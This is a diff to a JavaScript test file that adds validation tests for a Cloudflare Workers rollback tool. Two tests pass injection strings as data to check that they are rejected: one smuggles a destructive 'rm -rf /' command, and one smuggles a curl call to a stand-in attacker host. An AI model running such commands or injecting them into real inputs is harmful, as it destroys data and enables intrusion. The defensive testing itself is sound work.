@@ -2,10 +2,13 @@ import assert from "node:assert/strict";
 import { describe, it } from "node:test";
 
 import {
+  assertValidWorkerVersionId,
   deployWorkerVersion,
   getLatestDeploymentVersionId,
+  isValidWorkerVersionId,
   isWorkerScriptNotFound,
   listWorkerDeployments,
+  runRollbackCli,
 } from "./worker-rollback.mjs";
 
 describe("getLatestDeploymentVersionId", () => {
@@ -87,6 +90,32 @@ describe("listWorkerDeployments", () => {
       () => listWorkerDeployments("acct", "worker", "token", { fetchImpl }),
       /List deployments failed: Authentication error/,
     );
+  });
+});
+
+describe("assertValidWorkerVersionId", () => {
+  it("accepts a Cloudflare Workers version UUID", () => {
+    const id = "a1b2c3d4-e5f6-7890-abcd-ef1234567890";
+    assert.equal(isValidWorkerVersionId(id), true);
+    assert.equal(assertValidWorkerVersionId(id), id);
+  });
+
+  it("rejects shell injection in the version argument", () => {
+    const injection = '$(rm -rf /); echo pwned';
+    assert.equal(isValidWorkerVersionId(injection), false);
+    assert.throws(
+      () => assertValidWorkerVersionId(injection),
+      /Invalid Worker version ID/,
+    );
+  });
+});
+
+describe("runRollbackCli", () => {
+  it("returns 1 without calling the API when the version ID is invalid", async () => {
+    const code = await runRollbackCli([
+      'evil"; curl attacker.example; echo "',
+    ]);
+    assert.equal(code, 1);
   });
 });
 
